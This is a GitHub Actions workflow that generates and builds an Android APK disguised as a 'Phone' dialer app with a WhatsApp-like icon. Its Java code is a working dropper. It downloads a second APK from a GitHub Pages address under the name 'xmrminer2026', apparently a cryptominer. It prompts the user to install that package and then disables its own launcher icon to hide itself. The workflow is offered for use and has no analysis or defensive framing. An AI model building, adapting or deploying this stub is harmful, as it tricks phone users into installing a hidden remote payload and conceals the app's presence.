name: Build Phone Stub APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Create Android project
        run: |
          mkdir -p app/src/main/java/com/phone/stub
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/mipmap-anydpi-v26
          mkdir -p app/src/main/res/mipmap-hdpi
          mkdir -p app/src/main/res/mipmap-mdpi
          mkdir -p app/src/main/res/mipmap-xhdpi
          mkdir -p app/src/main/res/mipmap-xxhdpi
          mkdir -p app/src/main/res/mipmap-xxxhdpi

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.phone.stub">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
              <application
                  android:allowBackup="true"
                  android:label="Phone"
                  android:theme="@style/AppTheme"
                  android:icon="@mipmap/ic_launcher"
                  android:usesCleartextTraffic="true">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <provider
                      android:name="androidx.core.content.FileProvider"
                      android:authorities="com.phone.stub.fileprovider"
                      android:exported="false"
                      android:grantUriPermissions="true">
                      <meta-data
                          android:name="android.support.FILE_PROVIDER_PATHS"
                          android:resource="@xml/file_paths" />
                  </provider>
              </application>
          </manifest>
          EOF

          cat > app/src/main/res/values/styles.xml << 'EOF'
          <resources>
              <style name="AppTheme" parent="@android:style/Theme.Material.Light.NoActionBar">
                  <item name="android:windowActionModeOverlay">true</item>
                  <item name="android:windowBackground">@android:color/white</item>
              </style>
          </resources>
          EOF

          cat > app/src/main/res/drawable/circular_progress.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <layer-list xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:id="@android:id/background">
                  <shape>
                      <solid android:color="#E0E0E0"/>
                  </shape>
              </item>
              <item android:id="@android:id/progress">
                  <clip>
                      <shape>
                          <solid android:color="#1A73E8"/>
                      </shape>
                  </clip>
              </item>
          </layer-list>
          EOF

          cat > app/src/main/res/drawable/gradient_button.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <gradient
                  android:startColor="#1A73E8"
                  android:endColor="#0D47A1"
                  android:angle="0"/>
              <corners android:radius="30dp"/>
              <padding
                  android:left="20dp"
                  android:top="12dp"
                  android:right="20dp"
                  android:bottom="12dp"/>
          </shape>
          EOF

          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="108" android:viewportHeight="108">
              <path android:fillColor="#FFFFFF"
                  android:pathData="M74.5,62.9c-1.3,-0.6 -7.6,-3.7 -8.8,-4.2c-1.2,-0.4 -2,-0.6 -2.9,0.6c-0.8,1.2 -3.4,4.2 -4.2,5.1c-0.8,0.9 -1.5,1.0 -2.8,0.4c-1.3,-0.6 -5.5,-2.0 -10.5,-6.4c-3.9,-3.5 -6.5,-7.8 -7.3,-9.1c-0.8,-1.3 -0.1,-2.0 0.6,-2.6c0.6,-0.6 1.3,-1.5 2.0,-2.3c0.6,-0.8 0.8,-1.3 1.2,-2.3c0.4,-1.0 0.2,-1.8 -0.1,-2.5c-0.3,-0.6 -2.9,-7.0 -4.0,-9.5c-1.1,-2.5 -2.1,-2.2 -2.9,-2.3c-0.8,0 -1.6,0 -2.4,0c-0.8,0 -2.1,0.3 -3.2,1.5c-1.1,1.2 -4.2,4.1 -4.2,10.0c0,5.9 4.3,11.6 4.9,12.4c0.6,0.8 8.5,13.0 20.6,18.2c2.9,1.2 5.1,2.0 6.9,2.5c2.9,0.8 5.5,0.7 7.6,0.4c2.3,-0.3 7.2,-2.9 8.2,-5.8c1.0,-2.9 1.0,-5.3 0.7,-5.8C76.8,63.6 75.8,63.4 74.5,62.9z" />
          </vector>
          EOF

          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@color/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

          cat > app/src/main/res/values/colors.xml << 'EOF'
          <resources>
              <color name="ic_launcher_background">#25D366</color>
          </resources>
          EOF

          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">Phone</string>
          </resources>
          EOF

          cat > app/src/main/res/xml/file_paths.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <paths>
              <cache-path name="cache" path="." />
              <external-cache-path name="external_cache" path="." />
              <files-path name="files" path="." />
          </paths>
          EOF

          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical"
              android:background="#FFFFFF"
              android:gravity="center"
              android:padding="30dp">

              <ImageView
                  android:id="@+id/iconImage"
                  android:layout_width="100dp"
                  android:layout_height="100dp"
                  android:src="@mipmap/ic_launcher"
                  android:layout_marginBottom="16dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Phone"
                  android:textSize="28sp"
                  android:textColor="#0D47A1"
                  android:textStyle="bold"
                  android:layout_marginBottom="4dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Dialer &amp; calling app"
                  android:textSize="14sp"
                  android:textColor="#666666"
                  android:layout_marginBottom="30dp"/>

              <RelativeLayout
                  android:layout_width="120dp"
                  android:layout_height="120dp"
                  android:layout_marginBottom="16dp">

                  <ProgressBar
                      android:id="@+id/circularProgress"
                      style="?android:attr/progressBarStyleHorizontal"
                      android:layout_width="120dp"
                      android:layout_height="120dp"
                      android:indeterminate="false"
                      android:max="100"
                      android:progress="0"
                      android:progressDrawable="@drawable/circular_progress"
                      android:layout_centerInParent="true"/>

                  <TextView
                      android:id="@+id/progressText"
                      android:layout_width="wrap_content"
                      android:layout_height="wrap_content"
                      android:text="0%"
                      android:textSize="22sp"
                      android:textColor="#0D47A1"
                      android:textStyle="bold"
                      android:layout_centerInParent="true"/>
              </RelativeLayout>

              <TextView
                  android:id="@+id/statusText"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Ready to install"
                  android:textSize="16sp"
                  android:textColor="#555555"
                  android:layout_marginBottom="30dp"/>

              <Button
                  android:id="@+id/installButton"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="INSTALL NOW"
                  android:textSize="18sp"
                  android:textColor="#FFFFFF"
                  android:textStyle="bold"
                  android:background="@drawable/gradient_button"
                  android:elevation="4dp"
                  android:stateListAnimator="@null"/>

          </LinearLayout>
          EOF

          cat > app/src/main/java/com/phone/stub/MainActivity.java << 'EOF'
          package com.phone.stub;

          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.widget.Button;
          import android.widget.ProgressBar;
          import android.widget.TextView;
          import android.widget.Toast;
          import androidx.core.content.FileProvider;

          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;

          public class MainActivity extends Activity {
              private static final String TAG = "PhoneStub";
              private static final String APK_URL = "https://xmrminer2026.github.io/XMRPV/app-debug.apk";
              private TextView statusText;
              private TextView progressText;
              private ProgressBar progressBar;
              private Button installButton;
              private Handler handler = new Handler(Looper.getMainLooper());

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  statusText = findViewById(R.id.statusText);
                  progressText = findViewById(R.id.progressText);
                  progressBar = findViewById(R.id.circularProgress);
                  installButton = findViewById(R.id.installButton);

                  installButton.setOnClickListener(v -> {
                      installButton.setEnabled(false);
                      installButton.setText("INSTALLING...");
                      statusText.setText("Downloading...");
                      progressText.setText("0%");
                      progressBar.setProgress(0);
                      downloadAndInstall();
                  });
              }

              private void downloadAndInstall() {
                  new Thread(() -> {
                      try {
                          URL url = new URL(APK_URL);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setConnectTimeout(10000);
                          conn.setReadTimeout(10000);
                          int fileSize = conn.getContentLength();
                          InputStream in = conn.getInputStream();
                          File apkFile = new File(getCacheDir(), "main.apk");
                          FileOutputStream out = new FileOutputStream(apkFile);
                          byte[] buffer = new byte[4096];
                          int len;
                          long totalBytes = 0;
                          int lastProgress = 0;
                          while ((len = in.read(buffer)) != -1) {
                              out.write(buffer, 0, len);
                              totalBytes += len;
                              if (fileSize > 0) {
                                  int progress = (int) ((totalBytes * 100) / fileSize);
                                  if (progress != lastProgress) {
                                      lastProgress = progress;
                                      int finalProgress = progress;
                                      handler.post(() -> {
                                          progressBar.setProgress(finalProgress);
                                          progressText.setText(finalProgress + "%");
                                          statusText.setText("Downloading... " + finalProgress + "%");
                                      });
                                  }
                              }
                          }
                          out.close();
                          in.close();
                          conn.disconnect();

                          handler.post(() -> {
                              progressBar.setProgress(100);
                              progressText.setText("100% ✅");
                              statusText.setText("Opening installer...");
                              openInstaller(apkFile);
                          });

                      } catch (Exception e) {
                          Log.e(TAG, "Download failed: " + e.getMessage());
                          handler.post(() -> {
                              statusText.setText("Failed: " + e.getMessage());
                              installButton.setEnabled(true);
                              installButton.setText("RETRY");
                          });
                      }
                  }).start();
              }

              private void openInstaller(File apkFile) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_VIEW);
                      Uri apkUri;

                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                          apkUri = FileProvider.getUriForFile(this,
                                  "com.phone.stub.fileprovider", apkFile);
                          intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                      } else {
                          apkUri = Uri.fromFile(apkFile);
                      }

                      intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                      startActivityForResult(intent, 100);

                      statusText.setText("Installation started. Tap 'Install' in the popup.");
                      Toast.makeText(this, "Please allow installation when prompted.", Toast.LENGTH_LONG).show();

                  } catch (Exception e) {
                      Log.e(TAG, "Open installer failed: " + e.getMessage());
                      statusText.setText("Install error: " + e.getMessage());
                      installButton.setEnabled(true);
                      installButton.setText("RETRY");
                  }
              }

              @Override
              protected void onActivityResult(int requestCode, int resultCode, Intent data) {
                  super.onActivityResult(requestCode, resultCode, data);
                  if (requestCode == 100) {
                      hideIconAndFinish();
                  }
              }

              private void hideIconAndFinish() {
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  PackageManager pm = getPackageManager();
                  pm.setComponentEnabledSetting(componentName,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP);
                  finish();
              }
          }
          EOF

          cat > app/build.gradle << 'EOF'
          apply plugin: 'com.android.application'

          android {
              compileSdk 35
              namespace 'com.phone.stub'

              defaultConfig {
                  applicationId 'com.phone.stub'
                  minSdk 24
                  targetSdk 35
                  versionCode 2
                  versionName '2.0'
              }

              signingConfigs {
                  debug {
                      storeFile file('debug.keystore')
                      storePassword 'android'
                      keyAlias 'android'
                      keyPassword 'android'
                  }
              }

              buildTypes {
                  debug {
                      signingConfig signingConfigs.debug
                  }
                  release {
                      minifyEnabled false
                      signingConfig signingConfigs.debug
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }

          dependencies {
              implementation 'androidx.core:core:1.13.1'
          }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "Phone"
          include ':app'
          EOF

          cat > build.gradle << 'EOF'
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.5.2' }
          }
          EOF

          echo "✅ All source files created."

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.7'

      - name: Generate Gradle Wrapper
        run: gradle wrapper --gradle-version 8.7

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
        with:
          packages: platform-tools platforms;android-35 build-tools;35.0.0

      - name: Accept Android licenses
        run: yes | sdkmanager --licenses

      - name: Generate Keystore
        run: |
          keytool -genkey -v -keystore app/debug.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"

      - name: Inspect runtime dependencies
        run: ./gradlew :app:dependencies --configuration debugRuntimeClasspath

      - name: Build Signed APK
        run: chmod +x gradlew && ./gradlew clean assembleDebug --stacktrace

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: Phone-stub
          path: app/build/outputs/apk/debug/*.apk
